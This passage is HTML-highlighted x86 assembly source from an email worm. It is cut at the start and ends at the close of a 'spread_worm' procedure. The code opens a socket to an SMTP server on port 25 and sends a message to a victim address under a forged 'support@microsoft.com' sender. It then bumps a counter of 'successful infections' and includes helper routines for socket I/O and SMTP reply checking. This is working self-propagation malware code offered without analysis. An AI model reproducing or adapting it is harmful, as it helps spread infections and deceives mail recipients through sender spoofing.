    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_saddr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;EAX = IP address of smtp.iol.cz</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">@wsocket</span><span class="sc4">-</span><span class="sc5">wsocket</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@wsocket</span><span class="sc0">

</span><span class="sc5">wsocket</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">1900h</span><span class="sc0">           </span><span class="sc1">;25 port (SMTP)</span><span class="sc0">
</span><span class="sc5">sw_saddr</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;IP address of SMTP server</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">@wsocket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_connect</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;connect to IP</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sw_endsocket</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_get_response</span><span class="sc0">         </span><span class="sc1">;get response</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">sw_endsocket</span><span class="sc0">            </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sw_cmd_helo</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'HELO support'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">@sw_cmd_helo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">14</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_writesocket</span><span class="sc0">          </span><span class="sc1">;send HELO command</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_get_response</span><span class="sc0">         </span><span class="sc1">;get response</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">sw_endsocket</span><span class="sc0">            </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sw_cmd_mailfrom</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MAIL FROM:&lt;support@microsoft.com&gt;'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">@sw_cmd_mailfrom</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">35</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_writesocket</span><span class="sc0">          </span><span class="sc1">;send MAIL FROM command</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_get_response</span><span class="sc0">         </span><span class="sc1">;get response</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">sw_endsocket</span><span class="sc0">            </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sw_cmd_rcptto</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'RCPT TO: &lt;'</span><span class="sc0">
</span><span class="sc5">@sw_cmd_rcptto</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_writesocket</span><span class="sc0">          </span><span class="sc1">;send "RCPT TO: &lt;"</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_strlen</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_writesocket</span><span class="sc0">          </span><span class="sc1">;send "[email address]"</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sw_break</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'&gt;'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">@sw_break</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_writesocket</span><span class="sc0">          </span><span class="sc1">;send "&gt;"</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_get_response</span><span class="sc0">         </span><span class="sc1">;get response</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">sw_endsocket</span><span class="sc0">            </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sw_cmd_data</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'DATA'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">@sw_cmd_data</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_writesocket</span><span class="sc0">          </span><span class="sc1">;send DATA command</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_get_response</span><span class="sc0">         </span><span class="sc1">;get response</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">sw_endsocket</span><span class="sc0">            </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_mail_memory</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_strlen</span><span class="sc0">           </span><span class="sc1">;get size of mail message</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_writesocket</span><span class="sc0">          </span><span class="sc1">;send mail message</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sw_cmd_term</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">@sw_cmd_term</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_writesocket</span><span class="sc0">          </span><span class="sc1">;send mail terminator</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_get_response</span><span class="sc0">         </span><span class="sc1">;get response</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">sw_endsocket</span><span class="sc0">            </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sw_cmd_quit</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'QUIT'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">@sw_cmd_quit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sw_writesocket</span><span class="sc0">          </span><span class="sc1">;send QUIT command</span><span class="sc0">


    </span><span class="sc1">;increment counter of successful infections</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_count</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">sw_endsocket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_hSocket</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_closesocket</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;close connection</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">sw_sendmail</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">






</span><span class="sc1">;this procedure can get length of string</span><span class="sc0">

</span><span class="sc5">sw_strlen</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc5">sw_l_sl</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">sw_l_sl</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;this procedure can write data to socket</span><span class="sc0">

</span><span class="sc5">sw_writesocket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;ECX = size of data</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;EBX = ptr to data</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_send</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;this procedure can read response from the server</span><span class="sc0">

</span><span class="sc5">sw_get_response</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sw_response</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@sw_response</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">sw_recv</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get stmp server error code (4 bytez)</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">sw_err_r</span><span class="sc0">

</span><span class="sc5">sw_r_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sw_response_break</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@sw_response_break</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_hSocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sw_recv</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">sw_err_r</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">0Ah</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">sw_r_loop</span><span class="sc0">           </span><span class="sc1">;skip over CRLF</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">@sw_response</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sw_delta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' 022'</span><span class="sc0">          </span><span class="sc1">;analyse error codez</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sw_ok_r</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' 052'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sw_ok_r</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' 152'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">sw_ok_r</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' 453'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">sw_err_r</span><span class="sc0">
</span><span class="sc5">sw_ok_r</span><span class="sc4">:</span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">sw_err_r</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">end_spread_worm</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">spread_worm</span><span class="sc0"> </span><span class="sc5">EndP</span></div></body>
</html>
